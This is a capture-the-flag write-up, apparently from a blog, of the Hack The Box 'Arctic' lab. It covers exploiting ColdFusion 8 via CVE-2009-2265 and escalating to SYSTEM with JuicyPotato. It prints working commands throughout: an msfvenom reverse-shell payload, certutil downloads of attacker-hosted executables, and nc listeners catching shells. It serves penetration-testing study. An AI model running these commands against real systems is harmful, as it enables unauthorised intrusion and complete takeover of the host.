---
layout: post
title:  HTB Arctic Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-18 05:00:00 +0300
image:  '/images/htb_arctic.png'
tags:   [Write-ups, HTB, OSCP+, Easy, Windows, ColdFusion, CVE, Arbitrary-File-Upload, JuicyPotato, MSFVenom]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [CVE-2009-2265 - Arbitrary File Upload](#cve-2009-2265---arbitrary-file-upload)
- [Privilege Escalation](#privilege-escalation)
  - [Using JuicyPotato.exe to abuse SeImpersonatePrivilege enabled to get access as system with a msfvenom reverse shell](#using-juicypotatoexe-to-abuse-seimpersonateprivilege-enabled-to-get-access-as-system-with-a-msfvenom-reverse-shell)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports
nmap -p- -Pn --min-rate 10000 10.129.134.186

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p135,8500,49154 10.129.134.186
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 23:44 EST
Nmap scan report for 10.129.134.186
Host is up (0.036s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.60 seconds
```

There are three ports open, the ports 135 and 49154 seem to use RPC and the port 8500 seems to be some kind of website.
### Website Enumeration
Lets use our web browser to visit the port 8500:

```shell
http://10.129.134.186:8500/
```

Upon visiting it, we can see an index containing two directories:

```shell
CFIDE/               dir   03/22/17 08:52 μμ
cfdocs/              dir   03/22/17 08:55 μμ
```

They seem to be related to ColdFusion (CF).

Clicking on them and doing some enumeration, we found the following login portal:

```shell
http://10.129.134.186:8500/CFIDE/administrator/
```

Now we can see that the target is indeed running Adobe ColdFusion 8.

We tried some default credentials on the login portal to get access. But we werent successful.

# Foothold
### CVE-2009-2265 - Arbitrary File Upload
Searching on Google and searchsploit we found the CVE-2009-2265.

Lets get it using searchsploit:

```shell
searchsploit -m 50057
cp 50057.py exploit.py
```

Edit the exploit changing the following part of the code with our Kali tun0 IP and port, target IP and target port:

```shell
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.206'
    lport = 8443
    rhost = "10.129.134.186"
    rport = 8500
    filename = uuid.uuid4().hex
```

Run the exploit after saving the changes (We dont need to start a nc listener, the exploit will do that for us):

```shell
# Run the exploit
python3 exploit.py
```

Nice! We got access as tolis:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.134.186] 49269







Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\tolis\Desktop\user.txt
```

# Privilege Escalation
### Using JuicyPotato.exe to abuse SeImpersonatePrivilege enabled to get access as system with a msfvenom reverse shell
Enumerating the system we found out that the user has SeImpersonatePrivilege enabled:

```shell
C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We will try using JuicyPotato.exe to escalate privileges.

Lets download it and also create a shell.exe reverse shell payload with msfvenom:

```shell
# Get JuicyPotato.exe
https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

# Create shell.exe reverse shell payload with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.206 LPORT=9001 -a x64 --platform Windows -f exe -o shell.exe
```

Now move it into the target and run it:

```shell
# On Kali
python3 -m http.server 8080

# On target CLI
cd C:\Users\Public\Documents
certutil.exe -urlcache -split -f http://10.10.14.206:8080/JuicyPotato.exe JuicyPotato.exe
certutil.exe -urlcache -split -f http://10.10.14.206:8080/shell.exe shell.exe

# Start nc listener on Kali
nc -lvnp 9001

# Now run JuicyPotato.exe
JuicyPotato.exe -t * -p C:\Users\Public\Documents\shell.exe -l 443
```

It worked! We got access as system:

```shell
listening on [any] 9001 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.134.186] 49361
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```